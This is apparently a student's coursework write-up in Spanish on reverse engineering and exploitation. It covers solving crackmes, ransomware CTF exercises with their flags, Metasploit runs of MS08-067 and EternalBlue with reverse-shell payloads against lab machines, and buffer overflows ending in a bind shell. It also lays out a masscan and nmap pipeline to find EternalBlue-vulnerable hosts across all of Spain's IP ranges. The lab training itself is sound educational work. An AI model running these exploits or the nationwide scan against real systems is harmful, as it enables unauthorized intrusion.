# Solución Tarea 3 - Ingeniería Inversa y Exploiting

## 1. Ingeniería Inversa

### 1.1 Crackme 0

Al abrir el ejecutable en IDA Pro, pude observar la lógica del programa de forma bastante clara. El programa solicita una contraseña y compara la entrada del usuario con un valor hardcodeado en el código, identifiqué la contraseña correcta y validé que el programa me daba acceso.

![Crackme 0 resuelto](<capturas/crackme 0 resuelto.png>)

### 1.2 Crackme 1

El segundo desafío fue más interesante. Al abrir el ejecutable en IDA Pro, noté que el código estaba comprimido con UPX (Ultimate Packer for eXecutables). Esto es una técnica de ofuscación que dificulta el análisis estático.

![Señal de compresión UPX](capturas/crackme1-upx-compress.png)

Para poder analizar el código real, necesité desempaquetarlo. Utilicé la herramienta UPX con el comando:

```bash
upx -d crackme1.exe
```

![Desempaquetando con UPX](capturas/crackme1-upx-desempaquetar.png)

Una vez desempaquetado, pude cargar el binario nuevamente en IDA Pro. Aunque el código apareció estaba desordenado, logré identificar la lógica de validación de la contraseña siguiendo el orden de cada una de las letras ejemplo: 'z' en la posición 7Ah, 's' en la posición, etc.

![Código desempaquetado](capturas/crackme1-no-ordenado-resultado.png)

Finalmente encontré la contraseña correcta y validé que funcionaba.

![Contraseña correcta Crackme 1](capturas/crackme1.png)

### 1.3 Crackme 2 en .NET

El ejecutable estaba desarrollado en .NET. Examinar con IDA Pro no es adecuado pues el desensamblado no mostraba código legible como en los casos anteriores.

![IDA no puede analizar correctamente .NET](<capturas/metadata crackme2 IDA.png>)

Para binarios .NET, la herramienta adecuada es ILSpy el que facilitó enormemente el análisis.

Al revisar el código, identifiqué que la contraseña se construye de forma dinámica usando tres componentes:

1. El nombre de usuario ingresado
2. Un string hardcodeado llamado "elem1"
3. El nombre de la máquina donde se ejecuta

![Primer elemento de la contraseña](capturas/crackme2DotNet-1.png)

![Lógica completa de generación de contraseña](capturas/crackme2DotNet-2.png)

Con esta información, transforme de base64 "elem1" y construí la contraseña correcta combinando estos tres elementos y validé que el programa me daba acceso.

![Contraseña correcta Crackme 2](capturas/crackme2DotNet-3.png)

### 4. Análisis de Ransomware en ATENEA

#### Ejercicios Completados

![Ejercicios resueltos](<capturas/Atenea ejercicios resueltos.png>)

#### Ejercicio 1

El primer ejercicio consistía en analizar una muestra de la familia GandCrab.

**Flag:** `flag{d4d07dbc129592db4c5ff26cf2c92012}`

![Ejercicio 1 completado](<capturas/Atenea ejercicio 1.png>)

#### Ejercicio 2

El segundo desafío involucraba una muestra de Locky, otro ransomware conocido.

**Flag:** `flag{a270bb19c22d88bd2a4046f1c304db2c}`

![Ejercicio 2 completado](<capturas/Atenea ejercicio 2.png>)

#### Ejercicio 3

Para el tercer ejercicio busque en la plataforma `https://www.nomoreransom.org/` un desencriptador de Eking ransomware y no fue encontrado.

**Flag:** `flag{bd2999c5dec144603c529b89781587b6}`

![Ejercicio 3 completado](<capturas/Atenea ejercicio 3.png>)

#### Ejercicio 4

Este ejercicio requería identificar una herramienta específica utilizada por el ransomware. Tras busqueda en `Google`, identifiqué que se trataba de `vssadmin.exe`.

**Flag:** `flag{vssadmin.exe}`

![Ejercicio 4 completado](<capturas/Atenea ejercicio 4.png>)

#### Ejercicio 5

En este ejercicio descargue desde `https://id-ransomware.malwarehunterteam.com/` el desencriptador de este ransomware para las versiones 1, 4 y 5, al desencriptar encontré el `flag`: "DontPayRansom!!!".

**Flag:** `flag{2de5947546a61c62a6b056e99f2c6c85}`

![Ejercicio 5 completado](<capturas/Atenea ejercicio 5.png>)

#### Ejercicio 6 - WANNACRY

El último ejercicio descargué el ransomware wannacry, llevarlo a mi MV kali y ejecutar un comando string con grep "http" para encontrar todas las `urls` que contenia el código y entre ellas figura el dominio buscado: www.ccncertnomorecryaadrtifaderesddferrrqdfwa.com.

**Flag:** `flag{78769a4b0c76cf449aa023a19df761ea}`

![Análisis de WannaCry](capturas/atenea_solucion_wannacry.png)

### 5. Ransomware real en .Net

Ejercicio hecho en Windows Sandbox. Descargue la herramienta ILSpy para desensamblar .Net. Al analizar el ransomware noto la función del evento on_click de un botón de un formulatio. En ella hace una comparación del valor entrado en la caja de texto 1 con una función que recupera la contraseña. Al revisar dicha función se puede notar que la contraseña se encuentra en un fichero que debio ser creado previamente. Por lo tanto busco entre las funciones del programa una que cree un fichero; en ella se puede encontrar otra función que crea la contraseña. En la función `CreatePass` se puede ver hardcodeado la contraseña del ransomware. Por ultimo ejecuto el ransomware en mi WindowSandbox y valido que es la contraseña correcta.

![Interfaz del ransomware](capturas/ransomware_click_button.png)

![Extracción de la contraseña](capturas/ransomware_get_password.png)

![Creación de contraseña](capturas/ransomware_create_pass.png)

![Contraseña del ransomware](capturas/contrasenna_ransomware.png)

![Ransomware completado](capturas/ransomware_done.png)

---

## 2. Exploting

### 1. Explotación de Vulnerabilidades - Windows XP

Para explotar la máquina Windows XP, primero verifiqué la conectividad y obtuve la dirección IP de la máquina objetivo:

![IP de Windows XP](capturas/xp_ipconfig.png)

Configuré el exploit correspondiente:

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.56.106
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.102
```

![Configuración del payload en XP](capturas/xp_exploit_set_payload.png)

![Configuración completa del exploit](capturas/xp_exploit_set_payload_and_config.png)

Y al ejecutar el comando `exploit`, logro entrar en el XP.

![Explotación exitosa de Windows XP](capturas/xp_exploit_done.png)

### 2. Explotación de Vulnerabilidades - Windows Server 2008

Para Windows Server 2008, utilizo vulnerabilidad EternalBlue (MS17-010).

Al ejecutar `ipconfig` en la máquina Windows 2008 encuentro el ip a ejecutar el exploit

![IP de Windows 2008](capturas/win_2008_ipconfig.png)

Luego, identifiqué la vulnerabilidad con nmap:

![Nmap de Windows 2008](capturas/win_2008_nmap.png)

Luego, configuré el exploit en Metasploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.56.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.102
```

![Configuración del exploit para 2008](capturas/win_2008_config_exploit.png)

Y al ejecutar el comando `exploit`, logro entrar en el Windows 2008.

![Explotación exitosa de Windows 2008](capturas/win_2008_exploit_done.png)

### 3. Escaneo Masivo de Vulnerabilidades - EternalBlue en España

Realizar un escaneo masivo de dispositivos en España para identificar sistemas vulnerables a EternalBlue.

#### 3.1: Obtención de Rangos IP

Primero, descargué todos los rangos IP asignados a España en formato CIDR desde IP2Location:

```bash
curl -s https://www.nirsoft.net/countryip/es.csv | tr -d '"\r' | awk -F',' '{print $1"-"$2}' | grep -v "StartIP" > ips_espana.txt
```

Este archivo contiene todos los rangos de ip de España.

#### 3.2: Escaneo Rápido con Masscan

Utilicé Masscan para realizar un escaneo rápido del puerto 445 (SMB) en todos estos rangos. Masscan es extremadamente rápido y puede escanear millones de IPs en poco tiempo:

```bash
sudo masscan -iL ips_espana.csv -p445 --rate 10000 -oG scan_445.txt
```

Parámetros utilizados:

- `-iL ips_espana.txt`: Lee la lista de rangos CIDR desde el archivo
- `-p445`: Escanea solo el puerto 445 (SMB)
- `--rate 10000`: Envía hasta 10,000 paquetes por segundo
- `-oG scan_445.txt`: Guarda los resultados en formato "greppable"

#### 3.3: Filtrado de Hosts Activos

Una vez completado el escaneo, filtré solo las IPs que respondieron en el puerto 445:

```bash
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" scan_445.txt | sort -u > targets_445.txt
```

Este comando extrae las direcciones IP únicas de hosts que tienen el puerto 445 abierto.

#### 3.4: Verificación de Vulnerabilidad con Nmap

Finalmente, utilicé Nmap con su script NSE específico para detectar la vulnerabilidad MS17-010:

```bash
sudo nmap -iL targets_445.txt -p445 -Pn --script smb-vuln-ms17-010 -oN reporte_final_eternalblue.txt
```

Parámetros utilizados:

- `-iL targets_445.txt`: Lee la lista de objetivos del archivo
- `-p445`: Verifica el puerto 445
- `-Pn`: No realiza ping (ya sabemos que están activos)
- `--script smb-vuln-ms17-010`: Ejecuta el script que detecta EternalBlue
- `-oN reporte_final_eternalblue.txt`: Guarda el reporte en formato normal

#### POC local

Como no he podido abrir digital ocean con credito, he decidido hacerlo local solo usando uno de los 200 rangos de ip de España

##### 1. Massscan
![Masscan](capturas/mass_scan_poc_1.png)

##### 2. Nmap
![Nmap](capturas/mass_scan_poc_2_nmap.png)

### 4. Test 1

Explotación del buffer test 1. Sigo guiado en manual los pasos:

#### 4.1 Identificación de la Vulnerabilidad

Primero, ejecuté el programa y provoqué un crash enviando más datos de los que el buffer podía contener. Esto me confirmó que existía una vulnerabilidad de buffer overflow.

![Validación del error](capturas/test_1_1_validar_error.png)

#### 4.2 Análisis con Debugger

Utilicé `Immunity Debugger` para analizar el comportamiento del programa durante el crash. Esto me permitió ver exactamente cómo se sobrescribía la pila y qué registros eran afectados.

![Análisis en debugger](capturas/test_1_2_analisis_debuger.png)

#### 4.3 Cálculo del Offset

Ejecutar `!mona pc 300` para generar patrón circular y luego con ello ejecuto `!mona findmsp` para calcular el offset.

![Cálculo de la distancia](capturas/test_1_3_calcular_distancia.png)

![Obtención de la dirección de retorno](capturas/test_1_3_obtener_direccion_retorno.png)

#### 4.4 Validar la distancia

Al ejecutar de nuevo el debugger puedo ver que se ha puesto las "Bs" en la dirección de memoria que quiero.

![Distancia calculada](capturas/test_1_4_distancia_calculada.png)

#### 4.5 Estableciendo el Control del EIP

Una vez conocido el offset, modifiqué mi exploit para enviar exactamente esa cantidad de bytes de relleno, seguido de la dirección a la que quería saltar. Luego utilicé una instrucción JMP ESP marcar mi `brackpoint`.

![Estableciendo instrucciones JMP](capturas/test_1_5_1_establecer_instrucciones_jmp.png)

![Estableciendo instrucción en Python](capturas/test_1_5_2_establecer_instruccion_py.png)

![Validando instrucción JMP](capturas/test_1_5_3_validar_instruccion_jmp.png)

#### 4.6 Inyección de Shellcode

Finalmente, agregué el shellcode que ejecutaría la calculadora de Windows (calc.exe). Esto demuestra que tengo control total sobre el flujo de ejecución del programa.

![Agregando código de calculadora](capturas/test_1_6_1_agregar_codigo_calculadora.png)

![Explotación exitosa - Calculadora ejecutada](capturas/test_1_6_2_explotado_calculadora.png)

### 5. Test 2

Para el segundo ejercicio seguí el mismo proceso metodológico:

#### 5.1 Crash Inicial

Primero, provoqué el crash del programa para confirmar la vulnerabilidad.

![Validación del error en Test 2](capturas/test_2_1_validar_error.png)

#### 5.2 Análisis en Debugger

Analicé el crash en el debugger para entender cómo se comportaba la pila.

![Análisis en debugger Test 2](capturas/test_2_2_analisis_debuger.png)

#### 5.3 Cálculo del Offset con Patrón Cíclico

Utilicé el mismo método de patrón cíclico para calcular el offset exacto:

![Cálculo del patrón circular](capturas/test_2_3_calcular_patron_circular.png)

![Obtención de la dirección de retorno](capturas/test_2_3_obtener_direccion_retorno.png)

![Revisión del EIP](capturas/test_2_3_revisar_EIP.png)

#### 5.4 Validación de la distancia calculada

![Distancia calculada](capturas/test_2_4_distancia_calculada.png)

#### 5.5 Control del EIP y Explotación

Una vez calculado el offset, establecí el control del EIP y ejecuté mi shellcode:

![Estableciendo EIP](capturas/test_2_5_1_establecer_eip.png)

![Estableciendo instrucción en Python](capturas/test_2_5_2_establecer_instruccion_py.png)

#### 5.6 Inyección de shellcode

Inyecte la calculadora y valide un exploit exitoso. Siguiente paso poner bind shell.

![Explotación exitosa - Calculadora ejecutada](capturas/test_2_6_1_explotado_calculadora.png)

Ahora se crea el código para bing shell desde la kali con `msfvenom` para inyectar el bind shell

![Generar código bind shell](capturas/test_2_6_3_generar_payload_shell_bind.png)

Luego ejecutar el programa para que abra la escucha en el puerto 4444, y revisar si la conexión existe

![Conexión en escucha del puerto 4444](capturas/test_2_6_2_xp_shell_bid_connection.png)

Por ultimo ejecutar el exploit y validar que estamos dentro

```bash
msfconsole

use exploit/multi/handler

set PAYLOAD windows/meterpreter/bind_tcp
```

![Exploit XP Bind Shell](capturas/test_2_6_4_exploit_kali.png)
